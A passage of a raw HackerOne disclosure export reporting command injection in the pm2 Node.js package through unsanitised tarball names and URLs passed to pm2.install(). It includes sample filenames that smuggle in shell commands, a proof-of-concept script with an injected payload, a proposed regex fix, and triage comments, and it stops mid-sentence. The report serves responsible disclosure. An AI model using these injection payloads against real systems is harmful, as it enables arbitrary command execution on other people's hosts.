data-attachment-link=\"https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/000/517/386/e4d8d52f78edca76f9a0df62ac18b2fa0f43e27a/pm2_exploit.png?response-content-disposition=attachment%3B%20filename%3D%22pm2_exploit.png%22%3B%20filename%2A%3DUTF-8%27%27pm2_exploit.png\u0026amp;response-content-type=image%2Fpng\u0026amp;X-Amz-Algorithm=AWS4-HMAC-SHA256\u0026amp;X-Amz-Credential=ASIAQGK6FURQXIQUJBND%2F20201229%2Fus-west-2%2Fs3%2Faws4_request\u0026amp;X-Amz-Date=20201229T063116Z\u0026amp;X-Amz-Expires=3600\u0026amp;X-Amz-SignedHeaders=host\u0026amp;X-Amz-Security-Token=IQoJb3JpZ2luX2VjEJ7%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FwEaCXVzLXdlc3QtMiJHMEUCIQCSW9e%2BCRLewnzIhfyUQIFZeIhP4IGWCtHUT2hLFjUN4QIgKlrrsSX7JO9AUtPC04DkQ4aqLCIc%2BtgaHrxUzRKsC2EqtAMIVxABGgwwMTM2MTkyNzQ4NDkiDDeiStP9%2BOCDWdMNKCqRA2JJf1iaqRkqschykUnKmwKiU3mJNUd3tkRImvwu5rabEwETxSiWl5k1kbJ0rTepHnMF3Fv2BRaAbpd1Vu0t2aoIEry7oqPe6o6SKLNKB%2BXC%2FexGMhqyRy2%2FcJmnp%2B5Qbq4tBzoRWltXila49CNBcejP2XLezBboRC4iI5sLOE6gGgKQbnNo8CZLUZRSMFPyQ2D9gknuxlNQWE5OnbIlVH2RUF6n2f2nLLYUSiCcJ0BLl1Beeo37jB6Wojtnwh11Mc%2B6okiB%2FQtCRRbD%2FZ86Ymf4vjs0qqYcryHFVE7cyPZG9c2QX1adH%2F1EfMwBCjJzj%2B04Mcc5iJ7n%2Bp2ijGUpL9crKoZzgg1sqPgrA7ytMwXoDiS51U7uYLQwN%2B7cmBg4QTch2FiC0lJkZZLsOrVsD9Ke0%2FG8JeqjI5VfRu6gZ8LcRjDzVP%2BvcywvsN%2BYNFrjkBnPkTivS70vAFg2%2F%2FIsbMCgVV8bZbqMDq2I2LPhB%2FdO0%2F7o17RoI%2FY4qsC33bs6oDHrJ30fQFSWo1%2B5YDS2wYwPMPeKq%2F8FOusBiH5C7%2B6u5qXM%2FEpYLYzxIMm0IE%2BPTIo1jWaPg%2F4O4SmgDlQdEkd4Z6kXuX29rGjT69ErbO%2B0Ni8rPyw2noLhVav9I7IYxC%2FNCNMiM2GpLEebjCVCSQBJXuEtMbpTP8RRMP9Kn6W4y6DOiVxDvkIVP8tt1ZjhS1RQyGqjugLB%2FwGVib1fxZTeqbYpERuKBFJveZoZ1DJigNDP4oL23KKbXSmzxasGghOyWEUuuVyRROrX7bBS0O20tta9FRuW1g0MuK6BnH9p4wKwoPeijO8WANNgYkL11mV7huAgWuS%2BhR6ZkaVAnYs5Wghrtw%3D%3D\u0026amp;X-Amz-Signature=cd2e7293fc63b0eaf60bb15cac72abf4452f5494d0073ac4fc376f65c56980a7\" data-attachment-type=\"image/png\"\u003e\u003cimg src=\"https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/000/517/386/e4d8d52f78edca76f9a0df62ac18b2fa0f43e27a/pm2_exploit.png?response-content-disposition=attachment%3B%20filename%3D%22pm2_exploit.png%22%3B%20filename%2A%3DUTF-8%27%27pm2_exploit.png\u0026amp;response-content-type=image%2Fpng\u0026amp;X-Amz-Algorithm=AWS4-HMAC-SHA256\u0026amp;X-Amz-Credential=ASIAQGK6FURQXIQUJBND%2F20201229%2Fus-west-2%2Fs3%2Faws4_request\u0026amp;X-Amz-Date=20201229T063116Z\u0026amp;X-Amz-Expires=3600\u0026amp;X-Amz-SignedHeaders=host\u0026amp;X-Amz-Security-Token=IQoJb3JpZ2luX2VjEJ7%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FwEaCXVzLXdlc3QtMiJHMEUCIQCSW9e%2BCRLewnzIhfyUQIFZeIhP4IGWCtHUT2hLFjUN4QIgKlrrsSX7JO9AUtPC04DkQ4aqLCIc%2BtgaHrxUzRKsC2EqtAMIVxABGgwwMTM2MTkyNzQ4NDkiDDeiStP9%2BOCDWdMNKCqRA2JJf1iaqRkqschykUnKmwKiU3mJNUd3tkRImvwu5rabEwETxSiWl5k1kbJ0rTepHnMF3Fv2BRaAbpd1Vu0t2aoIEry7oqPe6o6SKLNKB%2BXC%2FexGMhqyRy2%2FcJmnp%2B5Qbq4tBzoRWltXila49CNBcejP2XLezBboRC4iI5sLOE6gGgKQbnNo8CZLUZRSMFPyQ2D9gknuxlNQWE5OnbIlVH2RUF6n2f2nLLYUSiCcJ0BLl1Beeo37jB6Wojtnwh11Mc%2B6okiB%2FQtCRRbD%2FZ86Ymf4vjs0qqYcryHFVE7cyPZG9c2QX1adH%2F1EfMwBCjJzj%2B04Mcc5iJ7n%2Bp2ijGUpL9crKoZzgg1sqPgrA7ytMwXoDiS51U7uYLQwN%2B7cmBg4QTch2FiC0lJkZZLsOrVsD9Ke0%2FG8JeqjI5VfRu6gZ8LcRjDzVP%2BvcywvsN%2BYNFrjkBnPkTivS70vAFg2%2F%2FIsbMCgVV8bZbqMDq2I2LPhB%2FdO0%2F7o17RoI%2FY4qsC33bs6oDHrJ30fQFSWo1%2B5YDS2wYwPMPeKq%2F8FOusBiH5C7%2B6u5qXM%2FEpYLYzxIMm0IE%2BPTIo1jWaPg%2F4O4SmgDlQdEkd4Z6kXuX29rGjT69ErbO%2B0Ni8rPyw2noLhVav9I7IYxC%2FNCNMiM2GpLEebjCVCSQBJXuEtMbpTP8RRMP9Kn6W4y6DOiVxDvkIVP8tt1ZjhS1RQyGqjugLB%2FwGVib1fxZTeqbYpERuKBFJveZoZ1DJigNDP4oL23KKbXSmzxasGghOyWEUuuVyRROrX7bBS0O20tta9FRuW1g0MuK6BnH9p4wKwoPeijO8WANNgYkL11mV7huAgWuS%2BhR6ZkaVAnYs5Wghrtw%3D%3D\u0026amp;X-Amz-Signature=cd2e7293fc63b0eaf60bb15cac72abf4452f5494d0073ac4fc376f65c56980a7\" class=\"markdown-inline-image\" style=\"display: inline-block\"\u003e\u003c/a\u003e\u003c/p\u003e\n\n\u003ch2 id=\"patch\"\u003ePatch\u003c/h2\u003e\n\n\u003cp\u003eThe vulnerability exists, because \u003ccode\u003etar\u003c/code\u003e archive filename provided as an argument of \u003ccode\u003epm2 install\u003c/code\u003e command is not validated in the correct way (here\u0026#39;s part of \u003ccode\u003elib/API/Modules/Modularizer.js\u003c/code\u003e file, \u003ccode\u003eModularizer.install\u003c/code\u003e function source code):\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre class=\"highlight plaintext\"\u003e\u003ccode\u003eelse if (opts.tarball || module_name.indexOf(\u0026#39;.tar.gz\u0026#39;) \u0026gt; -1) {\n    Common.logMod(`Installing TAR module`);\n    TAR.install(CLI, module_name, opts, cb)\n  }\n\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\n\u003cp\u003e\u003ccode\u003emodule_name.indexOf(\u0026#39;.tar.gz\u0026#39;) \u0026gt; -1\u003c/code\u003e will return \u003ccode\u003etrue\u003c/code\u003e always, even if it\u0026#39;s not present at the end of the filename. Also, there is no sanitization against Bash special characters like \u003ccode\u003e;\u003c/code\u003e or \u003ccode\u003e|\u003c/code\u003e which allows to inject arbitrary commands after \u003ccode\u003etar.gz\u003c/code\u003e file extension.\u003c/p\u003e\n\n\u003cp\u003eMy suggestion is to use validation similar to following (RegExp checks if filename contains only allowed characters and ends with \u003ccode\u003etar.gz\u003c/code\u003e):\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre class=\"highlight javascript\"\u003e\u003ccode\u003e\u003cspan class=\"k\"\u003eelse\u003c/span\u003e \u003cspan class=\"k\"\u003eif\u003c/span\u003e \u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"nx\"\u003eopts\u003c/span\u003e\u003cspan class=\"p\"\u003e.\u003c/span\u003e\u003cspan class=\"nx\"\u003etarball\u003c/span\u003e \u003cspan class=\"o\"\u003e||\u003c/span\u003e \u003cspan class=\"sr\"\u003e/^\u003c/span\u003e\u003cspan class=\"se\"\u003e[\u003c/span\u003e\u003cspan class=\"sr\"\u003ea-z_\u003c/span\u003e\u003cspan class=\"se\"\u003e\\.\u003c/span\u003e\u003cspan class=\"sr\"\u003e-\u003c/span\u003e\u003cspan class=\"se\"\u003e]\u003c/span\u003e\u003cspan class=\"sr\"\u003e+tar\u003c/span\u003e\u003cspan class=\"se\"\u003e\\.\u003c/span\u003e\u003cspan class=\"sr\"\u003egz$/ig\u003c/span\u003e\u003cspan class=\"p\"\u003e.\u003c/span\u003e\u003cspan class=\"nx\"\u003etest\u003c/span\u003e\u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"nx\"\u003emodule_name\u003c/span\u003e\u003cspan class=\"p\"\u003e))\u003c/span\u003e \u003cspan class=\"p\"\u003e{\u003c/span\u003e\n    \u003cspan class=\"nx\"\u003eCommon\u003c/span\u003e\u003cspan class=\"p\"\u003e.\u003c/span\u003e\u003cspan class=\"nx\"\u003elogMod\u003c/span\u003e\u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"s2\"\u003e`Installing TAR module`\u003c/span\u003e\u003cspan class=\"p\"\u003e);\u003c/span\u003e\n    \u003cspan class=\"nx\"\u003eTAR\u003c/span\u003e\u003cspan class=\"p\"\u003e.\u003c/span\u003e\u003cspan class=\"nx\"\u003einstall\u003c/span\u003e\u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"nx\"\u003eCLI\u003c/span\u003e\u003cspan class=\"p\"\u003e,\u003c/span\u003e \u003cspan class=\"nx\"\u003emodule_name\u003c/span\u003e\u003cspan class=\"p\"\u003e,\u003c/span\u003e \u003cspan class=\"nx\"\u003eopts\u003c/span\u003e\u003cspan class=\"p\"\u003e,\u003c/span\u003e \u003cspan class=\"nx\"\u003ecb\u003c/span\u003e\u003cspan class=\"p\"\u003e)\u003c/span\u003e\n  \u003cspan class=\"p\"\u003e}\u003c/span\u003e\n\n\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\n\u003cp\u003eAfter this change, injection is no longer possible:\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre class=\"highlight javascript\"\u003e\u003ccode\u003e\u003cspan class=\"dl\"\u003e\u0026#39;\u003c/span\u003e\u003cspan class=\"s1\"\u003euse strict\u003c/span\u003e\u003cspan class=\"dl\"\u003e\u0026#39;\u003c/span\u003e\u003cspan class=\"p\"\u003e;\u003c/span\u003e\n\n\u003cspan class=\"kd\"\u003econst\u003c/span\u003e \u003cspan class=\"nx\"\u003emodule_names\u003c/span\u003e \u003cspan class=\"o\"\u003e=\u003c/span\u003e \u003cspan class=\"p\"\u003e[\u003c/span\u003e\n    \u003cspan class=\"dl\"\u003e\u0026#39;\u003c/span\u003e\u003cspan class=\"s1\"\u003efoo.tar.gz\u003c/span\u003e\u003cspan class=\"dl\"\u003e\u0026#39;\u003c/span\u003e\u003cspan class=\"p\"\u003e,\u003c/span\u003e\n    \u003cspan class=\"dl\"\u003e\u0026#39;\u003c/span\u003e\u003cspan class=\"s1\"\u003esome-module_name.with_special_characters_but_still-valid.tar.gz\u003c/span\u003e\u003cspan class=\"dl\"\u003e\u0026#39;\u003c/span\u003e\u003cspan class=\"p\"\u003e,\u003c/span\u003e\n    \u003cspan class=\"dl\"\u003e\u0026#39;\u003c/span\u003e\u003cspan class=\"s1\"\u003efoo.tar.gz;echo \u0026quot;HERE\u0026quot;\u003c/span\u003e\u003cspan class=\"dl\"\u003e\u0026#39;\u003c/span\u003e\u003cspan class=\"p\"\u003e,\u003c/span\u003e    \u003cspan class=\"c1\"\u003e// sample injection at the end of the filename, after ;\u003c/span\u003e\n    \u003cspan class=\"dl\"\u003e\u0026#39;\u003c/span\u003e\u003cspan class=\"s1\"\u003etar.gz;whoami|ls;foo.tar.gz\u003c/span\u003e\u003cspan class=\"dl\"\u003e\u0026#39;\u003c/span\u003e   \u003cspan class=\"c1\"\u003e// sample injection in the middle of filename\u003c/span\u003e\n    \u003cspan class=\"p\"\u003e];\u003c/span\u003e\n\n\n\u003cspan class=\"nx\"\u003emodule_names\u003c/span\u003e\u003cspan class=\"p\"\u003e.\u003c/span\u003e\u003cspan class=\"nx\"\u003eforEach\u003c/span\u003e\u003cspan class=\"p\"\u003e(\u003c/span\u003e \u003cspan class=\"nx\"\u003emodule_name\u003c/span\u003e \u003cspan class=\"o\"\u003e=\u0026gt;\u003c/span\u003e \u003cspan class=\"nx\"\u003econsole\u003c/span\u003e\u003cspan class=\"p\"\u003e.\u003c/span\u003e\u003cspan class=\"nx\"\u003elog\u003c/span\u003e\u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"sr\"\u003e/^\u003c/span\u003e\u003cspan class=\"se\"\u003e[\u003c/span\u003e\u003cspan class=\"sr\"\u003ea-z_\u003c/span\u003e\u003cspan class=\"se\"\u003e\\.\u003c/span\u003e\u003cspan class=\"sr\"\u003e-\u003c/span\u003e\u003cspan class=\"se\"\u003e]\u003c/span\u003e\u003cspan class=\"sr\"\u003e+tar\u003c/span\u003e\u003cspan class=\"se\"\u003e\\.\u003c/span\u003e\u003cspan class=\"sr\"\u003egz$/ig\u003c/span\u003e\u003cspan class=\"p\"\u003e.\u003c/span\u003e\u003cspan class=\"nx\"\u003etest\u003c/span\u003e\u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"nx\"\u003emodule_name\u003c/span\u003e\u003cspan class=\"p\"\u003e)\u003c/span\u003e \u003cspan class=\"o\"\u003e===\u003c/span\u003e \u003cspan class=\"kc\"\u003etrue\u003c/span\u003e \u003cspan class=\"p\"\u003e))\u003c/span\u003e\n\n\u003cspan class=\"cm\"\u003e/*\ntrue\ntrue\nfalse\nfalse\n*/\u003c/span\u003e\n\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\n\u003ch2 id=\"supporting-material-references\"\u003eSupporting Material/References:\u003c/h2\u003e\n\n\u003cp\u003eVulnerability was tested with following configuration:\u003c/p\u003e\n\n\u003cul\u003e\n\u003cli\u003emacOS 10.14.5\u003c/li\u003e\n\u003cli\u003eNode 10.13.0\u003c/li\u003e\n\u003cli\u003enpm 6.9.0\u003c/li\u003e\n\u003c/ul\u003e\n\n\u003ch1 id=\"wrap-up\"\u003eWrap up\u003c/h1\u003e\n\n\u003cul\u003e\n\u003cli\u003eI contacted the maintainer to let them know: [N] \u003c/li\u003e\n\u003cli\u003eI opened an issue in the related repository: [N] \u003c/li\u003e\n\u003c/ul\u003e\n\n\u003cp\u003eCheers,\u003c/p\u003e\n\n\u003cp\u003ebl4de\u003c/p\u003e\n\n\u003ch2 id=\"impact\"\u003eImpact\u003c/h2\u003e\n\n\u003cp\u003eAn attacker is able to execute arbitrary commands if the name of \u003ccode\u003etar\u003c/code\u003e archive comes as user provided input (eg. from external script using \u003ccode\u003epm2\u003c/code\u003e API) and is used \u0026#39;as-is\u0026#39; in \u003ccode\u003epm2.install()\u003c/code\u003e call\u003c/p\u003e\n","weakness":{"id":58,"name":"Command Injection - Generic"},"original_report_id":null,"original_report_url":null,"attachments":[{"id":517386,"file_name":"pm2_exploit.png","expiring_url":"https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/000/517/386/e4d8d52f78edca76f9a0df62ac18b2fa0f43e27a/pm2_exploit.png?response-content-disposition=attachment%3B%20filename%3D%22pm2_exploit.png%22%3B%20filename%2A%3DUTF-8%27%27pm2_exploit.png\u0026response-content-type=image%2Fpng\u0026X-Amz-Algorithm=AWS4-HMAC-SHA256\u0026X-Amz-Credential=ASIAQGK6FURQXIQUJBND%2F20201229%2Fus-west-2%2Fs3%2Faws4_request\u0026X-Amz-Date=20201229T063116Z\u0026X-Amz-Expires=3600\u0026X-Amz-SignedHeaders=host\u0026X-Amz-Security-Token=IQoJb3JpZ2luX2VjEJ7%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FwEaCXVzLXdlc3QtMiJHMEUCIQCSW9e%2BCRLewnzIhfyUQIFZeIhP4IGWCtHUT2hLFjUN4QIgKlrrsSX7JO9AUtPC04DkQ4aqLCIc%2BtgaHrxUzRKsC2EqtAMIVxABGgwwMTM2MTkyNzQ4NDkiDDeiStP9%2BOCDWdMNKCqRA2JJf1iaqRkqschykUnKmwKiU3mJNUd3tkRImvwu5rabEwETxSiWl5k1kbJ0rTepHnMF3Fv2BRaAbpd1Vu0t2aoIEry7oqPe6o6SKLNKB%2BXC%2FexGMhqyRy2%2FcJmnp%2B5Qbq4tBzoRWltXila49CNBcejP2XLezBboRC4iI5sLOE6gGgKQbnNo8CZLUZRSMFPyQ2D9gknuxlNQWE5OnbIlVH2RUF6n2f2nLLYUSiCcJ0BLl1Beeo37jB6Wojtnwh11Mc%2B6okiB%2FQtCRRbD%2FZ86Ymf4vjs0qqYcryHFVE7cyPZG9c2QX1adH%2F1EfMwBCjJzj%2B04Mcc5iJ7n%2Bp2ijGUpL9crKoZzgg1sqPgrA7ytMwXoDiS51U7uYLQwN%2B7cmBg4QTch2FiC0lJkZZLsOrVsD9Ke0%2FG8JeqjI5VfRu6gZ8LcRjDzVP%2BvcywvsN%2BYNFrjkBnPkTivS70vAFg2%2F%2FIsbMCgVV8bZbqMDq2I2LPhB%2FdO0%2F7o17RoI%2FY4qsC33bs6oDHrJ30fQFSWo1%2B5YDS2wYwPMPeKq%2F8FOusBiH5C7%2B6u5qXM%2FEpYLYzxIMm0IE%2BPTIo1jWaPg%2F4O4SmgDlQdEkd4Z6kXuX29rGjT69ErbO%2B0Ni8rPyw2noLhVav9I7IYxC%2FNCNMiM2GpLEebjCVCSQBJXuEtMbpTP8RRMP9Kn6W4y6DOiVxDvkIVP8tt1ZjhS1RQyGqjugLB%2FwGVib1fxZTeqbYpERuKBFJveZoZ1DJigNDP4oL23KKbXSmzxasGghOyWEUuuVyRROrX7bBS0O20tta9FRuW1g0MuK6BnH9p4wKwoPeijO8WANNgYkL11mV7huAgWuS%2BhR6ZkaVAnYs5Wghrtw%3D%3D\u0026X-Amz-Signature=cd2e7293fc63b0eaf60bb15cac72abf4452f5494d0073ac4fc376f65c56980a7","file_size":4882621,"type":"image/png"}],"allow_singular_disclosure_at":"2019-10-24T09:53:10.706Z","allow_singular_disclosure_after":-37312686.25787814,"singular_disclosure_allowed":true,"vote_count":4,"voters":["mashoud1122","m4xx","nessun00x","chajer"],"severity":{"rating":"medium","score":6.4,"author_type":"Team","metrics":{"attack_vector":"local","attack_complexity":"high","privileges_required":"high","user_interaction":"none","scope":"unchanged","confidentiality":"high","integrity":"high","availability":"high"}},"structured_scope":{"databaseId":2986,"asset_type":"SOURCE_CODE","asset_identifier":"Other module","max_severity":"critical"},"abilities":{"assignable_team_members":[],"assignable_team_member_groups":[]},"can_edit_custom_fields_attributes":false,"activities":[{"id":5209979,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"Hi @bl4de,\n\nThank you for your submission. Your report is currently being reviewed and the HackerOne triage team will get back to you once there is additional information to share.\n\nKind regards,\n@sodacan\n","markdown_message":"\u003cp\u003eHi \u003ca href=\"/bl4de\"\u003e@bl4de\u003c/a\u003e,\u003c/p\u003e\n\n\u003cp\u003eThank you for your submission. Your report is currently being reviewed and the HackerOne triage team will get back to you once there is additional information to share.\u003c/p\u003e\n\n\u003cp\u003eKind regards,\u003cbr\u003e\n\u003ca href=\"/sodacan\"\u003e@sodacan\u003c/a\u003e\u003c/p\u003e\n","automated_response":false,"created_at":"2019-06-27T21:10:21.552Z","updated_at":"2019-06-27T21:10:21.552Z","actor":{"username":"sodacan","cleared":false,"url":"/sodacan","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/397/342/f09b69d30e08f05bbd6f12bf02200844bdf46f11_original.jpg/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"hackerone_triager":true,"hackerone_employee":null},"genius_execution_id":null,"team_handle":"nodejs-ecosystem","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":5238932,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"Hi Guys,\n\nJust a small update - while digging around, I found that injection is also possible when `pm2.install()` is called with an argument as an url to remote `tar.gz` archive file. The execution chain changes slightly and ends up in `retrieveRemote()` function in `lib/API/Modules/TAR.js` file (line 52):\n\n```javascript\n\nfunction retrieveRemote(url, dest, cb) {\n  Common.logMod(`Retrieving remote package ${url}...`)\n\n  var wget = spawn('wget', [url, '-O', dest, '-q'], {\n    stdio : 'inherit',\n    env: process.env,\n\t\tshell : true\n  })\n\n  wget.on('error', (err) =\u003e {\n    console.error(err.stack || err)\n  })\n\n  wget.on('close', (code) =\u003e {\n    if (code !== 0)\n      return cb(new Error('Could not download'))\n    return cb(null)\n  })\n}\n```\n\nWith modified payload, like the one below, it is possible to call `retrieveRemote()` and inject OS command(s) as a part of `url` passed as an argument:\n\n```javascript\n// pm2_exploit.js\n'use strict'\nconst pm2 = require('pm2')\n\n// payload - user controllable input\nconst payload = 'http://localhost:8000/some.tar.gz;whoami;uname -a;'\n\npm2.connect(function(err) {\n    if (err) {\n        console.error(err)\n        process.exit(2)\n    }\n\n    pm2.start({\n\n    }, (err, apps) =\u003e {\n        pm2.install(payload, {}) // injection\n        pm2.disconnect()\n        if (err) {\n            throw err\n        }\n    })\n})\n```\n\nNow, run exploit:\n`$ node pm2_exploit.js`\nand observe results in terminal window.\n\nAs `url` is not sanitized at all, injected command(s) are executed by this instruction:\n\n```javascript\nvar wget = spawn('wget', [url, '-O', dest, '-q'], {\n    stdio : 'inherit',\n    env: process.env,\n        shell : true\n  })\n```\n\n\nCheers,\n\nbl4de","markdown_message":"\u003cp\u003eHi Guys,\u003c/p\u003e\n\n\u003cp\u003eJust a small update - while digging around, I found that injection is also possible when \u003ccode\u003epm2.install()\u003c/code\u003e is called with an argument as an url to remote \u003ccode\u003etar.gz\u003c/code\u003e archive file. The execution chain changes slightly and ends up in \u003ccode\u003eretrieveRemote()\u003c/code\u003e function in \u003ccode\u003elib/API/Modules/TAR.js\u003c/code\u003e file (line 52):\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre class=\"highlight javascript\"\u003e\u003ccode\u003e\n\u003cspan class=\"kd\"\u003efunction\u003c/span\u003e \u003cspan class=\"nx\"\u003eretrieveRemote\u003c/span\u003e\u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"nx\"\u003eurl\u003c/span\u003e\u003cspan class=\"p\"\u003e,\u003c/span\u003e \u003cspan class=\"nx\"\u003edest\u003c/span\u003e\u003cspan class=\"p\"\u003e,\u003c/span\u003e \u003cspan class=\"nx\"\u003ecb\u003c/span\u003e\u003cspan class=\"p\"\u003e)\u003c/span\u003e \u003cspan class=\"p\"\u003e{\u003c/span\u003e\n  \u003cspan class=\"nx\"\u003eCommon\u003c/span\u003e\u003cspan class=\"p\"\u003e.\u003c/span\u003e\u003cspan class=\"nx\"\u003elogMod\u003c/span\u003e\u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"s2\"\u003e`Retrieving remote package \u003c/span\u003e\u003cspan class=\"p\"\u003e${\u003c/span\u003e\u003cspan class=\"nx\"\u003eurl\u003c/span\u003e\u003cspan class=\"p\"\u003e}\u003c/span\u003e\u003cspan class=\"s2\"\u003e...`\u003c/span\u003e\u003cspan class=\"p\"\u003e)\u003c/span\u003e\n\n  \u003cspan class=\"kd\"\u003evar\u003c/span\u003e \u003cspan class=\"nx\"\u003ewget\u003c/span\u003e \u003cspan class=\"o\"\u003e=\u003c/span\u003e \u003cspan class=\"nx\"\u003espawn\u003c/span\u003e\u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"dl\"\u003e\u0026#39;\u003c/span\u003e\u003cspan class=\"s1\"\u003ewget\u003c/span\u003e\u003cspan class=\"dl\"\u003e\u0026#39;\u003c/span\u003e\u003cspan class=\"p\"\u003e,\u003c/span\u003e \u003cspan class=\"p\"\u003e[\u003c/span\u003e\u003cspan class=\"nx\"\u003eurl\u003c/span\u003e\u003cspan class=\"p\"\u003e,\u003c/span\u003e \u003cspan class=\"dl\"\u003e\u0026#39;\u003c/span\u003e\u003cspan class=\"s1\"\u003e-O\u003c/span\u003e\u003cspan class=\"dl\"\u003e\u0026#39;\u003c/span\u003e\u003cspan class=\"p\"\u003e,\u003c/span\u003e \u003cspan class=\"nx\"\u003edest\u003c/span\u003e\u003cspan class=\"p\"\u003e,\u003c/span\u003e \u003cspan class=\"dl\"\u003e\u0026#39;\u003c/span\u003e\u003cspan class=\"s1\"\u003e-q\u003c/span\u003e\u003cspan class=\"dl\"\u003e\u0026#39;\u003c/span\u003e\u003cspan class=\"p\"\u003e],\u003c/span\u003e \u003cspan class=\"p\"\u003e{\u003c/span\u003e\n    \u003cspan class=\"na\"\u003estdio\u003c/span\u003e \u003cspan class=\"p\"\u003e:\u003c/span\u003e \u003cspan class=\"dl\"\u003e\u0026#39;\u003c/span\u003e\u003cspan class=\"s1\"\u003einherit\u003c/span\u003e\u003cspan class=\"dl\"\u003e\u0026#39;\u003c/span\u003e\u003cspan class=\"p\"\u003e,\u003c/span\u003e\n    \u003cspan class=\"na\"\u003eenv\u003c/span\u003e\u003cspan class=\"p\"\u003e:\u003c/span\u003e \u003cspan class=\"nx\"\u003eprocess\u003c/span\u003e\u003cspan class=\"p\"\u003e.\u003c/span\u003e\u003cspan class=\"nx\"\u003eenv\u003c/span\u003e\u003cspan class=\"p\"\u003e,\u003c/span\u003e\n        \u003cspan class=\"na\"\u003eshell\u003c/span\u003e \u003cspan class=\"p\"\u003e:\u003c/span\u003e \u003cspan class=\"kc\"\u003etrue\u003c/span\u003e\n  \u003cspan class=\"p\"\u003e})\u003c/span\u003e\n\n  \u003cspan class=\"nx\"\u003ewget\u003c/span\u003e\u003cspan class=\"p\"\u003e.\u003c/span\u003e\u003cspan class=\"nx\"\u003eon\u003c/span\u003e\u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"dl\"\u003e\u0026#39;\u003c/span\u003e\u003cspan class=\"s1\"\u003eerror\u003c/span\u003e\u003cspan class=\"dl\"\u003e\u0026#39;\u003c/span\u003e\u003cspan class=\"p\"\u003e,\u003c/span\u003e \u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"nx\"\u003eerr\u003c/span\u003e\u003cspan class=\"p\"\u003e)\u003c/span\u003e \u003cspan class=\"o\"\u003e=\u0026gt;\u003c/span\u003e \u003cspan class=\"p\"\u003e{\u003c/span\u003e\n    \u003cspan class=\"nx\"\u003econsole\u003c/span\u003e\u003cspan class=\"p\"\u003e.\u003c/span\u003e\u003cspan class=\"nx\"\u003eerror\u003c/span\u003e\u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"nx\"\u003eerr\u003c/span\u003e\u003cspan class=\"p\"\u003e.\u003c/span\u003e\u003cspan class=\"nx\"\u003estack\u003c/span\u003e \u003cspan class=\"o\"\u003e||\u003c/span\u003e \u003cspan class=\"nx\"\u003eerr\u003c/span\u003e\u003cspan class=\"p\"\u003e)\u003c/span\u003e\n  \u003cspan class=\"p\"\u003e})\u003c/span\u003e\n\n  \u003cspan class=\"nx\"\u003ewget\u003c/span\u003e\u003cspan class=\"p\"\u003e.\u003c/span\u003e\u003cspan class=\"nx\"\u003eon\u003c/span\u003e\u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"dl\"\u003e\u0026#39;\u003c/span\u003e\u003cspan class=\"s1\"\u003eclose\u003c/span\u003e\u003cspan class=\"dl\"\u003e\u0026#39;\u003c/span\u003e\u003cspan class=\"p\"\u003e,\u003c/span\u003e \u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"nx\"\u003ecode\u003c/span\u003e\u003cspan class=\"p\"\u003e)\u003c/span\u003e \u003cspan class=\"o\"\u003e=\u0026gt;\u003c/span\u003e \u003cspan class=\"p\"\u003e{\u003c/span\u003e\n    \u003cspan class=\"k\"\u003eif\u003c/span\u003e \u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"nx\"\u003ecode\u003c/span\u003e \u003cspan class=\"o\"\u003e!==\u003c/span\u003e \u003cspan class=\"mi\"\u003e0\u003c/span\u003e\u003cspan class=\"p\"\u003e)\u003c/span\u003e\n      \u003cspan class=\"k\"\u003ereturn\u003c/span\u003e \u003cspan class=\"nx\"\u003ecb\u003c/span\u003e\u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"k\"\u003enew\u003c/span\u003e \u003cspan class=\"nb\"\u003eError\u003c/span\u003e\u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"dl\"\u003e\u0026#39;\u003c/span\u003e\u003cspan class=\"s1\"\u003eCould not download\u003c/span\u003e\u003cspan class=\"dl\"\u003e\u0026#39;\u003c/span\u003e\u003cspan class=\"p\"\u003e))\u003c/span\u003e\n    \u003cspan class=\"k\"\u003ereturn\u003c/span\u003e \u003cspan class=\"nx\"\u003ecb\u003c/span\u003e\u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"kc\"\u003enull\u003c/span\u003e\u003cspan class=\"p\"\u003e)\u003c/span\u003e\n  \u003cspan class=\"p\"\u003e})\u003c/span\u003e\n\u003cspan class=\"p\"\u003e}\u003c/span\u003e\n\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\n\u003cp\u003eWith modified payload, like the one below, it is possible to call \u003ccode\u003eretrieveRemote()\u003c/code\u003e and inject OS command(s) as a part of 